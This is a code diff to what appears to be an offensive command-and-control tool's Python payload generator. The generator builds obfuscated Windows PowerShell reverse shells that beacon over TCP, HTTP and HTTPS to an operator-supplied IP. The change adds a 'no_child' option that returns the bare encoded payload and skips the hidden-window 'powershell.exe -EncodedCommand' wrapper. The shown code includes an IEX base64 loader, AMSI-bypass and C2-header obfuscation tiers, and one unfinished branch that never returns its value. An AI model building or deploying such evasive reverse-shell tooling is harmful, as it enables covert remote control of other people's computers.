@@ -16,7 +16,7 @@ brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
 brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
 
 
-def generate_windows_powershell_tcp(ip, port, obs, use_ssl):
+def generate_windows_powershell_tcp(ip, port, obs, use_ssl, no_child=None):
     """
     Generate a Windows PowerShell TCP reverse shell using ReadLine() buffering.
     obs: 1 (raw), 2 (Base64 Encoded), 3 (variable split obfuscation)
@@ -57,37 +57,54 @@ def generate_windows_powershell_tcp(ip, port, obs, use_ssl):
         )
 
     encoded = base64.b64encode(raw.encode('utf-16le')).decode()
-    final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
+    if not no_child:
+        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
+
+    else:
+        final_cmd = encoded
 
     if obs is None or obs == 0:
-        pyperclip.copy(final_cmd)
-        print(brightyellow + final_cmd)
-        print(brightgreen + "[+] Payload copied to clipboard")
-        return final_cmd
+        if not no_child:
+            pyperclip.copy(final_cmd)
+            print(brightyellow + final_cmd)
+            print(brightgreen + "[+] Payload copied to clipboard")
+            return final_cmd
+
+        else:
+            return final_cmd
 
     if obs == 1:
-        obs1_payload = generate_windows_powershell_tcp_obfuscate_level1(raw, ip, port, use_ssl)
+        obs1_payload = generate_windows_powershell_tcp_obfuscate_level1(raw, ip, port, use_ssl, no_child)
+        if no_child:
+            return obs1_payload
+
         pyperclip.copy(obs1_payload)
         print(brightyellow + obs1_payload)
         print(brightgreen + "[+] Payload copied to clipboard")
         return obs1_payload
 
     elif obs == 2:
-        obs2_payload = generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port, use_ssl)
+        obs2_payload = generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port, use_ssl, no_child)
+        if no_child:
+            return obs2_payload
+
         pyperclip.copy(obs2_payload)
         print(brightyellow + obs2_payload)
         print(brightgreen + "[+] Payload copied to clipboard")
         return obs2_payload
 
     elif obs == 3:
-        obs3_payload = generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port, use_ssl)
+        obs3_payload = generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port, use_ssl, no_child)
+        if no_child:
+            return obs3_payload
+
         pyperclip.copy(obs3_payload)
         print(brightyellow + obs3_payload)
         print(brightgreen + "[+] Payload copied to clipboard")
         return obs3_payload
 
 
-def generate_windows_powershell_tcp_obfuscate_level1(payload, ip, port, use_ssl: bool = False):
+def generate_windows_powershell_tcp_obfuscate_level1(payload, ip, port, use_ssl: bool = False, no_child=None):
     ip_parts = ip.split('.')
     ip_literal = "+'.'+".join(f"'{part}'" for part in ip_parts)
 
@@ -137,11 +154,16 @@ def generate_windows_powershell_tcp_obfuscate_level1(payload, ip, port, use_ssl:
         print(brightred + f"[-] ERROR failed to generate payload an unknown error ocurred!")
 
     encoded_one_liner = base64.b64encode(one_liner.encode('utf-16le')).decode()
-    run_encoded = f"$KpTz='{encoded_one_liner}';$ZpxL=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($KpTz));IEX $ZpxL"
+    if not no_child:
+        run_encoded = f"$KpTz='{encoded_one_liner}';$ZpxL=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($KpTz));IEX $ZpxL"
+
+    else:
+        run_encoded = encoded_one_liner
+    
     return run_encoded
 
 
-def generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port, use_ssl: bool = False):
+def generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port, use_ssl: bool = False, no_child=None):
     """
     Level 2: heavy obfuscation plus AMSI bypass via reflection.
     Embeds the provided one-liner and returns a fully EncodedCommand.
@@ -250,9 +272,15 @@ def generate_windows_powershell_tcp_obfuscate_level2(raw, ip, port, use_ssl: boo
 
     # encode for PowerShell -EncodedCommand
     encoded = base64.b64encode(one_liner.encode('utf-16le')).decode()
-    return f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
+    if not no_child:
+        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
 
-def generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port, use_ssl: bool = False):
+    else:
+        final_cmd = encoded
+
+    return final_cmd
+
+def generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port, use_ssl: bool = False, no_child=None):
     ip_parts = ip.split('.')
     ip_literal = "+'.'+".join(f"'{part}'" for part in ip_parts)
     port_literal = str(port)
@@ -433,11 +461,16 @@ def generate_windows_powershell_tcp_obfuscate_level3(raw, ip, port, use_ssl: boo
         print(brightred + f"[-] ERROR failed to generate payload an unknown error ocurred!")
 
     encoded = base64.b64encode(one_liner.encode('utf-16le')).decode()
-    final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
+    if not no_child:
+        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
+
+    else:
+        final_cmd = encoded
+        
     return final_cmd
 
 
-def generate_windows_powershell_http(ip, port, beacon_interval, obs):
+def generate_windows_powershell_http(ip, port, beacon_interval, obs, no_child=None):
     beacon_url = f"http://{ip}:{port}/"
     interval = beacon_interval
 
@@ -500,8 +533,11 @@ def generate_windows_powershell_http(ip, port, beacon_interval, obs):
     )
 
     encoded = base64.b64encode(raw.encode('utf-16le')).decode()
-    final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
-    
+    if not no_child:
+        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
+
+    else:
+        final_cmd = encoded
 
     if obs is None or obs == 0:
         pyperclip.copy(final_cmd)
@@ -511,13 +547,19 @@ def generate_windows_powershell_http(ip, port, beacon_interval, obs):
 
 
     if obs == 1:
-        obs1_http_payload = generate_windows_powershell_http_obfuscate_level1(raw, ip, port, beacon_interval)
+        obs1_http_payload = generate_windows_powershell_http_obfuscate_level1(raw, ip, port, beacon_interval, no_child)
+        if no_child:
+            return obs1_http_payload
+
         pyperclip.copy(obs1_http_payload)
         print(brightyellow + obs1_http_payload)
         print(brightgreen + "[+] Payload copied to clipboard")
         return obs1_http_payload
     elif obs == 2:
-        obs2_http_payload = generate_windows_powershell_http_obfuscate_level2(raw, ip, port, beacon_interval)
+        obs2_http_payload = generate_windows_powershell_http_obfuscate_level2(raw, ip, port, beacon_interval, no_child)
+        if no_child:
+            obs2_http_payload
+
         pyperclip.copy(obs2_http_payload)
         print(brightyellow + obs2_http_payload)
         print(brightgreen + "[+] Payload copied to clipboard")
@@ -526,7 +568,7 @@ def generate_windows_powershell_http(ip, port, beacon_interval, obs):
         return _obfuscate_level3(template)"""
 
 
-def generate_windows_powershell_http_obfuscate_level1(raw, ip, port, beacon_interval):
+def generate_windows_powershell_http_obfuscate_level1(raw, ip, port, beacon_interval, no_child=None):
     beacon_url = f"http://{ip}:{port}/"
     interval = beacon_interval
 
@@ -627,12 +669,16 @@ def generate_windows_powershell_http_obfuscate_level1(raw, ip, port, beacon_inte
 )
 
     encoded = base64.b64encode(one_liner.encode('utf-16le')).decode()
-    final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
+    if not no_child:
+        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
 
+    else:
+        final_cmd = encoded
+        
     return final_cmd
 
 
-def generate_windows_powershell_http_obfuscate_level2(raw, ip, port, beacon_interval):
+def generate_windows_powershell_http_obfuscate_level2(raw, ip, port, beacon_interval, no_child=None):
     """
     HTTP-based Windows reverse shell, with randomized PHP endpoints,
     fake browser headers, obfuscated C2 header keys and System.Text.Json parsing.
@@ -749,10 +795,16 @@ def generate_windows_powershell_http_obfuscate_level2(raw, ip, port, beacon_inte
     # finally encode for PowerShell
     raw_ps = "\n".join(ps_lines)
     encoded = base64.b64encode(raw_ps.encode('utf-16le')).decode()
-    return f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
+    if not no_child:
+        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
+
+    else:
+        final_cmd = encoded
+        
+    return final_cmd
 
 
-def generate_windows_powershell_https(ip, port, beacon_interval, obs):
+def generate_windows_powershell_https(ip, port, beacon_interval, obs, no_child=None):
     beacon_url = f"https://{ip}:{port}/"
     interval = beacon_interval
 
@@ -817,10 +869,16 @@ def generate_windows_powershell_https(ip, port, beacon_interval, obs):
     )
 
     encoded = base64.b64encode(raw.encode('utf-16le')).decode()
-    final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
-    
+    if not no_child:
+        final_cmd = f"powershell.exe -NoP -W Hidden -EncodedCommand {encoded}"
+
+    else:
+        final_cmd = encoded
 
     if obs is None or obs == 0:
+        if no_child:
+            return final_cmd
+            
         pyperclip.copy(final_cmd)
         print(brightyellow + final_cmd)
         print(brightgreen + "[+] Payload copied to clipboard")
